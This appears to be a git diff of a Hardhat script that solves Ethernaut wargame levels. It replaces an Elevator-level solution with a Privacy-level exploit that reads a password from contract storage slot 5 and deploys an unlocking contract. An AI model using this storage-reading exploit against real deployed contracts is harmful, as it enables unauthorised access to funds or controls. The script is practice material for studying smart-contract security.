@@ -3,16 +3,22 @@ import { ethers } from "hardhat";
 const ETHERNAUT_ADDRESS = "";
 
 async function main() {
-  // Deploy the WorkBuilding contract
-  const WorkBuilding = await ethers.getContractFactory("WorkBuilding");
-  const workBuilding = await WorkBuilding.deploy({
-    gasLimit: 1000000,
-  });
-  console.log("Deploy WorkBuilding contract at", workBuilding.address);
+  // Deploy the Privacy contract
+  const Privacy = await ethers.getContractFactory("Privacy");
+  const privacy = await Privacy.attach(ETHERNAUT_ADDRESS);
+  console.log("Attach Privacy contract at", privacy.address);
 
-  const goToLastFloorTx = await workBuilding.goToLastFloor(ETHERNAUT_ADDRESS);
-  await goToLastFloorTx.wait();
-  console.log("Move to the last floor, tx:", goToLastFloorTx.hash);
+  // Get the password in the storage
+  const password = await ethers.provider.getStorageAt(ETHERNAUT_ADDRESS, 5);
+
+  // Deploy the UnlockContract and unlock Privacy
+  const UnlockContract = await ethers.getContractFactory("UnlockContract");
+  const unlockContract = await UnlockContract.deploy(
+    ETHERNAUT_ADDRESS,
+    password,
+    { gasLimit: 1000000 }
+  );
+  console.log("Deploy UnlockContract contract at", unlockContract.address);
 }
 
 main().catch((error) => {
